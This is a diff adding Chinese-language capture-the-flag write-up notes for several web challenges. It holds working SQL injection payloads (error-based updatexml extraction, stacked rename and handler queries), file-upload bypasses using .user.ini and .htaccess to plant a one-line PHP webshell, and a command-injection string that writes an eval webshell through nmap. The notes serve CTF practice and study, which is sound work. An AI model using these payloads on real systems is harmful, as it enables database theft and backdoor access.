@@ -2568,3 +2568,329 @@ https://www.cnblogs.com/leixiao-/p/9784904.html
 ### [极客大挑战 2019]HardSQL
 
 报错注入
+
+空格被过滤，用`（）`绕过
+
+获取数据库payload：
+
+~~~
+?username=admin'or(updatexml(1,concat(0x7e,(database()),0x7e),1))%23&password=admin
+~~~
+
+![image-20210520100638554](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520100638554.png)
+
+获取所有数据库payload：**这里遇到一个问题，显示的信息不全，并且limit我不知道怎么绕过空格使用，用括号绕过没效果**
+
+~~~
+?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1))%23&password=admin
+~~~
+
+![image-20210520101459044](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520101459044.png)
+
+使用`right()`函数，成功爆出全部的数据库名称，payload：
+
+~~~
+?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(RIGHT(schema_name,7)))from(information_schema.schemata)),0x7e),1))%23&password=admin
+~~~
+
+![image-20210520102620076](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520102620076.png)
+
+开始爆破 `geek`中的表名，payload：**等于号也被过滤了，用`like`代替**
+
+~~~
+?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like("geek")),0x7e),1))%23&password=admin
+~~~
+
+![image-20210520102854813](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520102854813.png)
+
+开始获取H4rDsq1表中的字段，payload：
+
+~~~
+?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like("H4rDsq1")),0x7e),1))%23&password=admin
+~~~
+
+![image-20210520103020443](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520103020443.png)
+
+获取geek.H4rDsq1表中的信息，payload：
+
+~~~
+?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),0x7e),1))%23&password=admin
+~~~
+
+获得左半部分的flag：flag{e1df861a-33ff-42af-ad
+
+![image-20210520103240195](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520103240195.png)
+
+~~~
+?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(right(password,22)))from(geek.H4rDsq1)),0x7e),1))%23&password=admin
+~~~
+
+获取右半部分flag：2af-ada8-3c1375bf5430}
+
+![image-20210520103431924](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520103431924.png)
+
+拼接flag：flag{e1df861a-33ff-42af-ada8-3c1375bf5430}
+
+### [GXYCTF2019]BabySQli
+
+过滤了 `or、and`
+
+~~~
+select * from user where username = '$name'
+~~~
+
+### [SUCTF 2019]CheckIn
+
+过滤了 `php、php3、php4、php5、pht、phtml`等后缀，限制了内容以图片头开头，且内容中不能有<?
+
+下面是我绕过的情况，最终传递上去了假的图片，但是并不能解析
+
+![image-20210520111101492](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520111101492.png)
+
+看看别人的wp
+
+前置知识：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini</a>
+
+> 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。
+
+```
+auto_prepend_file=shell1.jpg //.user.ini配置文件，auto_prepend_file的意思是在施行同一目录下的PHP文件之前，自动加载文件，相当于include()和require()函数
+```
+
+### [网鼎杯 2020 青龙组]AreUSerialz
+
+~~~php
+ <?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op="2";
+    protected $filename="flag.php";
+    protected $content="aaa";
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+
+~~~
+
+`__wakeup()`触发于`unserilize()`调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得`__wakeup`失效。
+
+### [MRCTF2020]你传你🐎呢
+
+上传.htaccess和.png两个文件即可
+
+![image-20210520194054808](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520194054808.png)
+
+上传图片格式解析成功，说明一句话木马上传成功，用蚁剑成功连接即可。
+
+![image-20210520194750013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520194750013.png)
+
+### [GYCTF2020]Blacklist
+
+![image-20210520215927831](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520215927831.png)
+
+![image-20210520215947311](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520215947311.png)
+
+用堆叠注入可以。
+
+查询databases:
+
+![image-20210520220341018](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220341018.png)
+
+查询数据库中的表：
+
+![image-20210520220559365](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220559365.png)
+
+查询 `FlagHere` 表中的字段：
+
+![image-20210520220648149](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220648149.png)
+
+查询`words`表中的字段：
+
+![image-20210520220750951](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220750951.png)
+
+**由此可以想到该输入框的SQL语句应该是 `select id,data from words where id = ?`**
+
+因为可以是堆叠查询，这时候我们可以使用改名的方法，把含有flag的"FlagHere"表改名为words，再把flag字段改名为id，结合上面的1' or 1 #爆出表内所有的内容就可以查到flag了。
+
+payload:
+
+~~~sql
+1';rename table `words` to `words1`;rename table `FlagHere` to `words`;alter table words change flag id varchar(100) character set utf8 collate utf8_general_ci NOT NULL;desc words;#
+~~~
+
+![image-20210521094218343](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521094218343.png)
+
+rename和alter关键字都被过滤了！！！
+
+查看别人的wp,使用`Handler`
+
+MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。
+————————————————
+`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭 
+
+最终获取flag的payload：
+
+~~~
+?inject=1';handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` close#
+~~~
+
+![image-20210521095405104](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521095405104.png)
+
+又学到了一个姿势。
+
+
+
+### [MRCTF2020]Ez_bypass
+
+打开网页是PHP代码，开始代码审计吧
+
+```php
+include 'flag.php';
+$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
+if(isset($_GET['gg'])&&isset($_GET['id'])) {
+    $id=$_GET['id'];
+    $gg=$_GET['gg'];
+    if (md5($id) === md5($gg) && $id !== $gg) {//使用数组绕过md5  ?id[]=a&gg[]=b
+        echo 'You got the first step';
+        if(isset($_POST['passwd'])) {
+            $passwd=$_POST['passwd'];
+            if (!is_numeric($passwd))// 用PHP弱类型特殊性绕过 passwd=1234567a
+            {
+                 if($passwd==1234567)
+                 {
+                     echo 'Good Job!';
+                     highlight_file('flag.php');
+                     die('By Retr_0');
+                 }
+                 else
+                 {
+                     echo "can you think twice??";
+                 }
+            }
+            else{
+                echo 'You can not get it !';
+            }
+
+        }
+        else{
+            die('only one way to get the flag');
+        }
+}
+    else {
+        echo "You are not a real hacker!";
+    }
+}
+else{
+    die('Please input first');
+}
+}
+```
+
+成功绕过两处PHP代码限制，获得flag值
+
+![image-20210521100210960](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521100210960.png)
+
+### [BUUCTF 2018]Online Tool
+
+进入网站就是代码，开始审计
+
+~~~php
+<?php
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
+}
+~~~
+
+https://blog.csdn.net/qq_26406447/article/details/100711933
+
+```
+?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
+?host=\' <?php @eval($_POST["hack"]);?> -oG hack.php \' //escapeshellarg()执行
+```
+
